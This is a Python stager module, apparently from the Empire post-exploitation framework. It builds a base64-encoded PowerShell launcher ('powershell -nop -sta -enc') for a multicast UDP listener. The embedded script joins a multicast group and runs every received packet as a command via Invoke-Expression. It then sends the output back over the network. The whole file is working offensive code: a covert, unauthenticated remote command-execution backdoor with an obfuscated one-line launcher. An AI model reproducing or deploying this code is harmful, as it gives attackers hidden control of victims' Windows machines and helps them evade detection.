from lib.common import helpers
import base64

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'mDNS Server Launcher',

            'Author': ['@424f424f'],

            'Description': ('Generates a launcher for a basic mDNS server.'),

            'Comments': [
                ''
            ]
        }


        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

    def generate(self):

        listenerName = self.options['Listener']['Value']      


        server_script = """
function Start-mDNSServer {
    <#
    .SYNOPSIS
    Start the server
    .DESCRIPTION
    Listen for mDNS Commands
    .EXAMPLE
    Start-mDNSServer
    .PARAMETER MultiCastGroup
    The Multicast Group to listen on
    .PARAMETER MultiCastPort
    The port to listen for UDP packets
    #>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false, Position = 0)]
        [String]
        $MultiCastGroup = "224.1.1.1",

        [Parameter(Mandatory = $false, Position = 1)]
        [String]
        $MultiCastPort = 51111,

        [Parameter(Mandatory = $false, Position = 1)]
        [String]
        $BindPort = 51112
    )
    Begin {
        
    }
    Process {      
        While($True) {   
            Try {
                $udp_client = New-Object System.Net.Sockets.UdpClient
                $udp_client.ExclusiveAddressUse = $False
                $LocalEndPoint = New-Object System.Net.IPEndPoint([ipaddress]::Any,$MultiCastPort)
                $udp_client.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress,$true)
                $udp_client.ExclusiveAddressUse = $False
                $udp_client.Client.Bind($LocalEndPoint)
                $multicast_group = [IPAddress]::Parse($MultiCastGroup)
                $udp_client.JoinMulticastGroup($multicast_group)
                $receivebytes = $udp_client.Receive([ref]$LocalEndPoint)
                If ($receivebytes) {
                    $receive_data = ([text.encoding]::ASCII).GetString($receivebytes)
                    $command_results = (Invoke-Expression -Command $receive_data 2>&1 | Out-String )
                    $udp_client.Close()
                    $udp_client = new-Object System.Net.Sockets.UdpClient $BindPort
                    $multicast_group = [IPAddress]$MultiCastGroup
                    $udp_client.JoinMulticastGroup($multicast_group)
                    $enc = [system.Text.Encoding]::UTF8
                    $response_packet = $enc.GetBytes($command_results) 
                    $endpoint = New-Object Net.IPEndpoint([IPAddress]$MultiCastGroup,$MultiCastPort)
                    $udp_client.Connect($endpoint)
                    $udp_client.Send($response_packet,$response_packet.Length) |Out-Null
                    $udp_client.Close()
                    continue
                }
            }
            Catch {
            $ErrorMessage = $_.Exception.Message
            $FailedItem = $_.Exception.ItemName
            }
        } 
    }
    End {
        $udp_client.Close()
    }
}
Start-mDNSServer""" 
        base64_script = base64.b64encode(str(server_script).encode('UTF-16LE'))
        base64_launcher = base64_script.replace('\n','')

        code = "powershell -nop -sta -enc %s" % (base64_launcher)

        return code
